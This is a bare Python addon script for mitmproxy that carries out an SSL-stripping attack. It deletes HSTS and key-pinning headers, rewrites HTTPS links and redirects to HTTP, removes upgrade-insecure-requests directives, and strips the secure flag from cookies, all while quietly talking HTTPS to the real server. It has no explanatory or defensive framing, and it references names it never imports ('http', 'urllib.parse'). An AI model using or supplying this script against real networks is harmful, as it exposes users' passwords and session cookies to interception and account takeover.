import mitmproxy
import re
import urllib
import typing  

secure: typing.Set[str] = set()

def request(flow: http.HTTPFlow) -> None:
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    if flow.request.pretty_host in secure:
        flow.request.scheme = 'https'
        flow.request.port = 443
        flow.request.host = flow.request.pretty_host

def response(flow: http.HTTPFlow) -> None:
    flow.response.headers.pop('Strict-Transport-Security', None)
    flow.response.headers.pop('Public-Key-Pins', None)
    flow.response.content = flow.response.content.replace(b'https://', b'http://')
    pattern = br'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(pattern, b'', flow.response.content, flags=re.IGNORECASE)
    
    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure.add(hostname)
        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)
    if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
        csp = flow.response.headers['Content-Security-Policy']
        flow.response.headers['Content-Security-Policy'] = re.sub(r'upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
        
    cookies = flow.response.headers.get_all('Set-Cookie')
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)